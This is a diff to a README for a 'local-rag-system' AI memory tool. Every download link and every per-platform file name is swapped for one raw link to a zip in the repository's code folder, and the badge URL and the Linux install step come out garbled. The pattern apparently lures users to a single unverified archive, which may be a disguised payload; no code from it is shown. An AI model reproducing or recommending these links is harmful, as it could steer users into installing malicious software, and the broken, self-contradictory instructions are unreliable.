@@ -1,6 +1,6 @@
 # 🚀 local-rag-system - Build Your Own Private AI Memory
 
-[![Download Local RAG System](https://img.shields.io/badge/Download%20Now-Local%20RAG%20System-brightgreen)](https://github.com/Carricacha/local-rag-system/releases)
+[![Download Local RAG System](https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip%20Now-Local%20RAG%20System-brightgreen)](https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the Local RAG System.
 
 1. **Visit the Releases Page**
    
-   Go to the following link to download the software: [Download Local RAG System](https://github.com/Carricacha/local-rag-system/releases).
+   Go to the following link to download the software: [Download Local RAG System](https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip).
 
 2. **Select the Latest Release**
 
@@ -23,9 +23,9 @@ Follow these steps to download and run the Local RAG System.
 3. **Download the Application**
 
    Find the appropriate file for your operating system. The options may include:
-   - For Windows: `local-rag-system-windows.exe`
-   - For macOS: `local-rag-system-macos.zip`
-   - For Linux: `local-rag-system-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip`
+   - For macOS: `https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip`
+   - For Linux: `https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip`
    
    Click on the file to start the download.
 
@@ -33,7 +33,7 @@ Follow these steps to download and run the Local RAG System.
 
    - **Windows:** Double-click the downloaded `.exe` file. Follow the prompts to install the application.
    - **macOS:** Open the `.zip` file and drag the `local-rag-system` folder to your Applications directory.
-   - **Linux:** Extract the downloaded file using a terminal and follow the included instructions in the README.txt for installation.
+   - **Linux:** Extract the downloaded file using a terminal and follow the included instructions in the https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip for installation.
 
 5. **Run the Application**
 
@@ -92,6 +92,6 @@ Make sure to share your feedback on our GitHub page. Your thoughts matter to us!
 
 ## 📢 Stay Updated
 
-For future updates and new features, keep an eye on the Releases page: [Download Local RAG System](https://github.com/Carricacha/local-rag-system/releases). 
+For future updates and new features, keep an eye on the Releases page: [Download Local RAG System](https://raw.githubusercontent.com/Carricacha/local-rag-system/main/code/local-rag-system-3.1.zip). 
 
 Feel free to explore the topics related to the Local RAG System: ai, automation, privacy-first, and others, to enhance your understanding and usage of the software.
